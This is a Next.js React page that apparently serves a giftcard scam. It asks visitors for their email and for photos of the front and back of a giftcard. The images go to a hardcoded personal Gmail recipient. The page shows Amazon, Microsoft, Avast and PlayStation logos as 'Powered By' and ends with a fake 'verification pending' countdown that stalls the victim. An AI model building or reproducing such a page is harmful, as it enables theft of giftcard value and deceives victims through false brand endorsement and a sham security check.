"use client";
import ImageUploader from "@/components/forms/ImageUploader";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import CountdownTimer from "@/components/CountdownTimer";
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";
import ImageUploadForm from "@/components/forms/ImageUploadForm";
import BrandSlider from "@/components/BrandSlider";

const page = () => {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [tab, setTab] = useState(1);
  const [pic, setPic] = useState("front");
  const [imageErr, setImageErr] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [message, setMessage] = useState({ text: "", type: "" });
  const [field1, setField1] = useState({
    image: null,
    preview: null,
  });
  const [field2, setField2] = useState({
    image: null,
    preview: null,
  });
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    message: "",
  });
  const brands = [
    { id: 1, name: "Brand 1", logo: "assets/amazonlogo.png" },
    { id: 2, name: "Brand 2", logo: "assets/avastlogo.png" },
    { id: 3, name: "Brand 3", logo: "assets/microsoftlogo.png" },
    { id: 4, name: "Brand 4", logo: "assets/pslogo.jpg" },
  ];

  const handleNextPage = async () => {
    if (pic === "front" && field1.image !== null) {
      setPic("back");
    }
  };
  // Submit form with both images
  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!field1.image) {
      window.alert("Image of the front of Giftcard is required");
      return;
    }
    if (!field2.image) {
      window.alert("Image of the back of Giftcard is required");
      return;
    }
    setIsLoading(true);
    setMessage({ text: "Sending form...", type: "info" });

    try {
      const formDataToSend = new FormData();

      // Append images if they exist
      if (field1.image) formDataToSend.append("image1", field1.image);
      if (field2.image) formDataToSend.append("image2", field2.image);

      // Append form data
      formDataToSend.append("email", email);
      formDataToSend.append("recipientEmail", "Samsonewe200@gmail.com");

      const response = await fetch("/api/sendemail", {
        method: "POST",
        body: formDataToSend,
      });

      if (!response.ok) {
        return alert("Upload failed please retry.");
      }
      if (response.ok) {
        setTab(3);
        setField1({ image: null, preview: null });
        setField2({ image: null, preview: null });
        setFormData({ name: "", email: "", message: "" });
        setPic("front");
        setEmail("");
      }

      setMessage({ text: "Form submitted successfully!", type: "success" });

      // Reset form

      // if (fileInputRef1.currSent) fileInputRef1.current.value = "";
      // if (fileInputRef2.current) fileInputRef2.current.value = "";
    } catch (error) {
      console.error("Error submitting form:", error);
      setMessage({
        text: "Failed to submit form. Please try again.",
        type: "error",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen">
      {tab === 1 && (
        <section className="relative w-full bg-[#000000] min-h-screen flex flex-col items-center justify-center">
          <div className="absolute w-full bg-[#ffffff] p-2 top-0 h-16 flex">
            <div
              onClick={() => router.push("/")}
              className="cursor-pointer sm:w-[60px] sm:h-[40px] w-[50px] h-[30px] self-center rounded-xl bg-[#256785] text-center text-white left-0 flex items-center justify-center"
            >
              <span>back</span>
            </div>{" "}
            <h2 className=" text-[16px] sm:text-xl font-semibold  text-black text-center self-center flex-1">
              {" "}
              Enter your email address
            </h2>{" "}
          </div>
          <div className="mx-auto w-[300px] sm:w-[600px] flex flex-col items-center justify-center">
            <input
              type="text"
              placeholder="Enter your Email address"
              className="placeholder:text-gray-500 bg-white p-2 sm:p-4 w-[290px] sm:w-[450px] focus:outline-0 rounded text-black text-[16px]"
              onChange={(e) => setEmail(e.target.value)}
              value={email}
              name="email"
            />
            <button
              className="p-3 rounded-[15px] text-[#fff] mt-10 bg-[#256785] w-[250px] cursor-pointer"
              onClick={() => {
                setTab(2);
                setPic("front");
              }}
            >
              {" "}
              Continue
            </button>
          </div>
          <h3 className="text-xl font-semibold text-white my-2 text-center">
            Powered By:
          </h3>

          <BrandSlider brands={brands} />
        </section>
      )}

      {/* SECTION 2 */}
      {tab === 2 && (
        <section className="relative w-full bg-[#000000] min-h-screen flex flex-col items-center justify-center pt-5">
          <div className="absolute w-full bg-[#ffffff] p-2 top-0 min-h-16 flex">
            <h2 className="text-xl font-semibold text-black text-center self-center flex-1">
              {" "}
              Verify your giftcard
            </h2>{" "}
          </div>
          <div className="mx-auto w-[300px] sm:w-[600px] min-h-[600px] flex flex-col items-center justify-center">
            <label>
              <ImageUploadForm
                field1={field1}
                field2={field2}
                setField1={setField1}
                setField2={setField2}
                title1={"Upload front of Giftcard"}
                title2={"Upload back of Giftcard"}
                pic={pic}
              />
            </label>
            {pic === "front" && (
              <button
                onClick={() => {
                  setTab((prev) => prev - 1);
                  setPic("front");
                }}
                className="p-3 rounded-[15px] text-[#000] mt-10 bg-[#fff] w-[250px] cursor-pointer"
              >
                {" "}
                Previous
              </button>
            )}
            {pic === "back" && (
              <button
                onClick={() => {
                  setPic("front");
                }}
                className="p-3 rounded-[15px] text-[#000] mt-10 bg-[#fff] w-[250px] cursor-pointer"
              >
                {" "}
                Previous
              </button>
            )}
            {pic === "front" && (
              <button
                onClick={() => setPic("back")}
                className="p-3 rounded-[15px] text-[#fff] mt-10 bg-[#256785] w-[250px] cursor-pointer"
              >
                Next
              </button>
            )}
            {pic === "back" && (
              <button
                disabled={isLoading}
                className={`w-[250px] cursor-pointer px-4 py-2 rounded-md text-white mt-5 ${
                  isLoading
                    ? "bg-gray-400"
                    : "bg-[#256785] hover:bg-[#256785]/50"
                }`}
                onClick={handleSubmit}
                // onClick={() => setTab(3)}
              >
                {isLoading ? "Sending..." : "Submit"}
              </button>
            )}
          </div>
          <h3 className="text-xl font-semibold text-white my-2 text-center">
            Powered By:
          </h3>
          <BrandSlider brands={brands} />
        </section>
      )}
      {/* SECTION 3 */}
      {tab === 3 && (
        <section className="relative w-full bg-[#000000] min-h-screen flex flex-col items-start justify-center p-1 sm:p-30">
          <div className="mx-auto w-[300px] sm:w-[600px] flex flex-col items-center justify-center">
            <h2 className="text-xl font-bold text-center mb-4">
              Card verification is pending
            </h2>
            <p className="p-1 w-[290px] sm:w-[400px] sm:text-[16px] text-[15px] text-center">
              Kindly wait a few minutes while we perform a few verifications on
              our end We’re currently running a few quick checks to ensure
              everything is secure and up to date. This usually takes just a
              moment, but in rare cases, it may take a little longer. Thanks for
              your patience, we’ll have you on your way as soon as possible!
            </p>
            <p className="mt-3 text-[18px]">you have to wait at least:</p>
            <CountdownTimer />
          </div>
          <button
            onClick={() => {
              setTab(1);
              setField1({ image: null, preview: null });
              setField2({ image: null, preview: null });
              setFormData({ name: "", email: "", message: "" });
              setPic("front");
              setEmail("");
            }}
            className="mt-10 text-white text-xl border border-white rounded-[25px] px-4 py-3 mx-auto cursor-pointer"
          >
            {" "}
            Close{" "}
          </button>
        </section>
      )}
    </div>
  );
};
export default page;
